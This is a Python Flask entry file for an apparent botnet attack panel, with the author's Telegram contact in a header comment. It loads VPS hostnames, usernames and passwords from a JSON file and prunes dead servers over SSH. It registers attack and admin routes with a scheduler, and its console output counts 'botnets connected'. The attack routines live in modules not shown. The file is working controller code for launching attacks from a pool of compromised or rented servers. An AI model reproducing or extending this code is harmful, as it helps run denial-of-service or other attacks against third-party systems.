# Code by Jxdn
# Contacts Telegram @damnnn67
import socket
import logging, json, os, time, paramiko
from flask import Flask, render_template
from waitress import serve
from threading import Thread
from colorama import Fore, init
from routes.admin_routes import Admin
from routes.attack_routes import Attack, scheduler
from routes.console_routes import Console

app = Flask(__name__, None, "static")

app.register_blueprint(Attack)
app.register_blueprint(Admin)
app.register_blueprint(Console)

def check_vps_connection(vps_address, username, password, timeout=5):
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(vps_address, username=username, password=password, timeout=timeout)
        ssh.close()
        return True
    except paramiko.AuthenticationException:
        print(Fore.RED, "[Warning] Authentication failed. Please check your username and password.", Fore.RESET)
        return False
    except paramiko.SSHException as ssh_err:
        print(Fore.RED, f"[Warning] SSH error: {ssh_err}", Fore.RESET)
        return False
    except socket.timeout:
        print(Fore.RED, "[Warning] Connection timed out. Please check your network connection and try again.", Fore.RESET)
        return False
    except paramiko.ssh_exception.NoValidConnectionsError:
        print(Fore.RED, "[Warning] No Valid Connection. Please check your username and password.", Fore.RESET)
        return False

def prune_dead_servers(vps_list):
    alive_servers = []
    dead_servers = []

    for vps in vps_list:
        if check_vps_connection(vps['hostname'], vps['username'], vps['password']):
            alive_servers.append(vps)
        else:
            dead_servers.append(vps)

    with open("./data/vps_servers.json", "w") as file:
        json.dump(alive_servers, file, indent=4)

    with open("./data/death_servers.json", "w") as file:
        json.dump(dead_servers, file, indent=4)

    return len(alive_servers), len(dead_servers)

with open("./data/vps_servers.json") as file:
    vps_list = json.load(file)

@app.route('/')
def indexpage():
    return render_template('attack.html')

@app.route('/admin')
def adminpage():
    return render_template('admin.html')

@app.errorhandler(404)
def error_404(e):
    return render_template('404.html'), 404

@app.errorhandler(500)
def error_500(e):
    return render_template('500.html'), 500

if __name__ == "__main__":
    os.system('clear')
    init()
    print(Fore.WHITE, """HI SIR""", Fore.RESET)
    print(Fore.MAGENTA, "WELCOME TO API SYSTEM", Fore.RESET)
    print(Fore.BLUE, "CHECKING ALL BOTNETS", Fore.RESET)
    connected_count, dead_count = prune_dead_servers(vps_list)
    print(f"[System] Total botnets connected: {connected_count}")
    print(f"[System] Total botnets pruned (dead): {dead_count}")
    scheduler.start()
    with open("config.json") as a:
        data = json.load(a)
    serve(app, host=data["hostname"], port=data["port"])
